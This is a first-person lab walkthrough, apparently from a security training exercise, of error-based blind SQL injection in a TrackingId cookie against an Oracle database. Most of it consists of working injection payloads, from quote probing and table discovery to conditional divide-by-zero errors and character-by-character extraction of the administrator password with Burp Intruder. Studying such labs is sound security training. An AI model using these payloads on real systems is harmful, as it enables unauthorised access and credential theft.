
I first appended a single quotation mark to the cookie:

```
TrackingId=xyz'
```

This resulted in an error. When I changed it to two quotation marks:

```
TrackingId=xyz''
```

the error disappeared, suggesting that the quotation mark was affecting the underlying SQL query.

To determine the database type, I tested an Oracle-specific query:

```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

The request was processed successfully. Since Oracle requires a table to be specified in a `SELECT` statement, this indicated that the backend was using an **Oracle database**.

I then confirmed that the input was actually being processed as SQL by querying a non-existent table:

```
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
```

This produced an error, confirming the SQL injection.


I checked whether the `users` table existed:

```
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

No error was returned, confirming that the `users` table existed.


The key idea was to intentionally trigger a database error only when a specific condition was true.

I tested:

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

This generated an error because `1=1` is true and `1/0` causes a divide-by-zero error.

I then tested:

```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

This time, there was no error because the condition was false.

This gave me a reliable **true/false oracle**: an HTTP 500 error indicated a true condition, while a normal HTTP 200 response indicated a false condition.

I used the same technique to check whether the `administrator` user existed:

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

The error occurred, confirming that the `administrator` account existed.


I then used the `LENGTH()` function to determine the length of the administrator's password:

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

I repeated the request with increasing values until the error disappeared.

This allowed me to determine that the administrator's password was **20 characters long**.


Testing every possible character manually would require a large number of requests, so I moved the request to **Burp Intruder**.

I used `SUBSTR()` to extract one character from the password at a time:

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

I placed Intruder payload markers around the character being tested:

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

I configured a **Simple list** containing lowercase letters and numbers:

```
a-z
0-9
```

I then launched the Intruder attack.

The important difference was the HTTP status code:

- **HTTP 500** → the tested character was correct.
- **HTTP 200** → the tested character was incorrect.

I repeated the process for every position in the password by changing the `SUBSTR()` offset:

```
SUBSTR(password,1,1)
SUBSTR(password,2,1)
SUBSTR(password,3,1)
...
SUBSTR(password,20,1)
```

By combining the correct character from each position, I recovered the complete **20-character administrator password**.